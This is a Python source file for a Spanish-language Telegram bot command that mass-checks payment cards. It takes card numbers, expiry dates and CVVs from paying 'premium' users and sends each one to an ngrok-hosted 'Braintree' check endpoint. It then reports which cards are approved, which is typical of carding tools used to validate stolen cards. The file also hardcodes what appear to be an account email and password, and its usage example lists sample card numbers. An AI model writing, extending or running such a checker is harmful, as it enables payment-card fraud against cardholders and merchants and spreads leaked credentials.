# commands/mass_b3_check.py
import sys
import os
import time
import requests
import json
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.database import get_credits, set_credits, get_plan, is_premium
from utils.bin_database import get_bin_info
from config import ADMIN_ID

def setup_mass_b3_check_command(bot):
    @bot.message_handler(commands=['mb3'])
    def mass_b3_check_command(message):
        print(f"🔹 Comando /mb3 recibido de {message.from_user.first_name}")
        process_mass_b3_check(bot, message)

def process_mass_b3_check(bot, message):
    user_id = message.from_user.id
    username = message.from_user.first_name
    
    # Solo para usuarios premium
    if not is_premium(user_id):
        bot.reply_to(message, "❌ Comando solo para usuarios premium.\n@Dunxito para adquirir tu plan.")
        return
    
    # Verificar créditos
    credits = get_credits(user_id)
    if credits <= 0:
        bot.reply_to(message, "❌ Créditos insuficientes.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ Uso: `/mb3 <lista_de_tarjetas>`\nEjemplo: `/mb3 4282104033002891|11|29|500 5104886655308541|09|29|094`\n\n📊 **Límites:**\n• Mínimo: 2 tarjetas\n• Máximo: 10 tarjetas\n\n💳 **Costos:**\n• 1 crédito por tarjeta", parse_mode="Markdown")
            return
        
        cards = parts[1:]
        
        # Validar mínimo 2 tarjetas
        if len(cards) < 2:
            bot.reply_to(message, "❌ Se necesitan 2 tarjetas como mínimo.")
            return
        
        # Limitar a 10 tarjetas máximo
        if len(cards) > 10:
            cards = cards[:10]
            bot.reply_to(message, f"⚠️ Se procesarán solo las primeras 10 tarjetas")
        
        # Verificar créditos
        total_cost = len(cards)
        if credits < total_cost:
            bot.reply_to(message, f"❌ Necesitas {total_cost} créditos para {len(cards)} tarjetas")
            return
        
        processing_msg = bot.reply_to(message, f"🔄 Procesando {len(cards)} tarjetas en Braintree...")
        
        start_time = time.time()
        results = []
        approved_cards = 0
        
        for i, card_data in enumerate(cards, 1):
            try:
                result, is_approved = process_single_b3_card(card_data, i)
                results.append(result)
                if is_approved:
                    approved_cards += 1
                
                if i % 2 == 0:
                    bot.edit_message_text(f"🔄 Procesando... {i}/{len(cards)}", message.chat.id, processing_msg.message_id)
                    
            except Exception as e:
                results.append(f"❌ Tarjeta {i}: Error")
        
        # Restar créditos
        new_credits = credits - total_cost
        set_credits(user_id, new_credits)
        
        end_time = time.time()
        total_time = round(end_time - start_time, 2)
        plan = get_plan(user_id, new_credits)
        
        bot.delete_message(message.chat.id, processing_msg.message_id)
        
        response_text = f"""
- - - - - - - - - - - - - - - - - - - - -
 Mass Braintree Check
- - - - - - - - - - - - - - - - - - - - - 
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➙ Braintree CCN
- - - - - - - - - - - - - - - - - - - - - 

{"\n".join(results)}

- - - - - - - - - - - - - - - - - - - - -
🝮 Total : {len(cards)} tarjetas
🝮 Approved : {approved_cards} tarjetas
🝮 Costo : {total_cost} créditos (1 por tarjeta)
🝮 Time : {total_time}s
🝮 Credits Left : {new_credits}
🝮 Checked by : {username} [{plan}]
"""
        bot.reply_to(message, response_text)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def process_single_b3_card(card_data, card_number):
    try:
        if '|' not in card_data:
            return f"❌ Tarjeta {card_number}: Formato incorrecto", False
        
        card_parts = card_data.split('|')
        if len(card_parts) != 4:
            return f"❌ Tarjeta {card_number}: Formato incorrecto", False
        
        cc_number, expiry_month, expiry_year, cvv = card_parts
        
        # Validaciones básicas
        if not (cc_number.isdigit() and len(cc_number) == 16):
            return f"❌ Tarjeta {card_number}: Número inválido", False
            
        if len(expiry_year) == 2:
            formatted_year = expiry_year
        elif len(expiry_year) == 4:
            formatted_year = expiry_year[2:]
        else:
            return f"❌ Tarjeta {card_number}: Año inválido", False
        
        # URL de Braintree
        braintree_url = f"https://componential-unstruggling-shantel.ngrok-free.dev//check_cc?cc={cc_number}|{expiry_month}|{formatted_year}|{cvv}&email=wasdark336@gmail.com&password=bbmEZs65p!BJLNz"
        
        response = requests.get(braintree_url, timeout=30).text
        
        # Procesar respuesta
        status = "DECLINED ❌"
        is_approved = False
        
        try:
            data = json.loads(response)
            if data.get("status", "").lower() == "approved":
                status = "APPROVED ✅"
                is_approved = True
        except:
            if "approved" in response.lower():
                status = "APPROVED ✅"
                is_approved = True
        
        bin_info = get_bin_info(cc_number[:6])
        result_text = f"🝮 {card_number}. {cc_number}|{expiry_month}|{expiry_year}|{cvv} | {status} | {bin_info['scheme']}"
        
        return result_text, is_approved
    
    except Exception as e:
        return f"❌ Tarjeta {card_number}: Error", False